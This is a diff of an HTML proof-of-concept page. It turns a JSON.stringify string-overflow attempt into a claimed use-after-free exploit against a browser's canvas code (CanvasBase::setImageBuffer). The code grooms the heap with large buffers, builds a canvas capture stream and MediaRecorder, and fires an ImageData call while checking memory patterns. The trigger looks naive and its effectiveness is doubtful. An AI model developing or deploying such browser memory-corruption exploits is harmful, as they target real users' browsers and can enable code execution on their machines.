@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>FastStringifier Overflow PoC v4</title>
+    <title>Canvas UAF PoC v2</title>
     <style>
         #trigger {
             margin: 20px;
@@ -20,15 +20,15 @@
     </style>
 </head>
 <body>
-    <h1>FastStringifier Overflow PoC v4</h1>
-    <p>Click to trigger string length overflow with memory checks.</p>
-    <button id="trigger">Trigger Overflow</button>
+    <h1>Canvas UAF PoC v2</h1>
+    <p>Click to trigger UAF in CanvasBase::setImageBuffer.</p>
+    <button id="trigger">Trigger UAF</button>
+    <canvas id="canvas" width="100" height="100"></canvas>
     <script>
         function setupMemoryCheck() {
             const buffers = [];
-            // Allocate buffers with 0x46 (mimic Canvas UAF)
             for (let i = 0; i < 50; i++) {
-                const buf = new ArrayBuffer(4096); // 4KB each
+                const buf = new ArrayBuffer(4096); // 4KB
                 const view = new Uint8Array(buf);
                 view.fill(0x46); // Fill with 0x46
                 buffers.push(view);
@@ -50,10 +50,10 @@
             alert('Initiating PoC...');
             try {
                 // Heap grooming
-                alert('Grooming heap with 300x512KB buffers...');
+                alert('Grooming heap with 200x256KB buffers...');
                 const groom = [];
-                for (let i = 0; i < 300; i++) {
-                    const buf = new ArrayBuffer(512 * 1024); // 512KB
+                for (let i = 0; i < 200; i++) {
+                    const buf = new ArrayBuffer(256 * 1024); // 256KB
                     const view = new Uint8Array(buf);
                     view.fill(0x41);
                     groom.push(view);
@@ -63,29 +63,35 @@
                 const check = setupMemoryCheck();
                 alert('Memory checker initialized (50x4KB buffers with 0x46).');
 
-                // Allocate large string
-                const stringSize = 350000000; // ~350MB
-                alert(`Attempting to allocate string of size ${stringSize} bytes...`);
+                // Create canvas and capture stream
+                alert('Creating canvas and capturing stream...');
+                const canvas = document.getElementById('canvas');
+                const stream = canvas.captureStream();
+                const options = {};
+                const recorder = new MediaRecorder(stream, options);
+
+                // Create sensitive objects
+                alert('Creating sensitive objects...');
+                const textarea = document.createElement('textarea');
+                const cols = textarea.cols;
+                const imageDataSettings = {};
                 setTimeout(() => {
                     try {
-                        const string = "A".repeat(stringSize); // Try "A" pattern
-                        alert('String allocated successfully.');
-
-                        // Check memory before stringify
+                        // Check memory before ImageData
                         const before = check();
-                        alert(`Memory before stringify: ${before}`);
+                        alert(`Memory before ImageData: ${before}`);
 
-                        // Trigger overflow
-                        alert('Attempting JSON.stringify...');
-                        JSON.stringify(string);
+                        // Trigger UAF with ImageData
+                        alert('Attempting ImageData creation...');
+                        new ImageData(recorder.videoBitsPerSecond || 100, cols, imageDataSettings);
 
-                        // Check memory after (unlikely if crash occurs)
+                        // Check memory after
                         const after = check();
-                        alert(`Memory after stringify: ${after}`);
+                        alert(`Memory after ImageData: ${after}`);
                     } catch (err) {
                         alert(`Error: ${err.message}`);
                     }
-                }, 400);
+                }, 500);
             } catch (err) {
                 alert(`Initial error: ${err.message}`);
             }
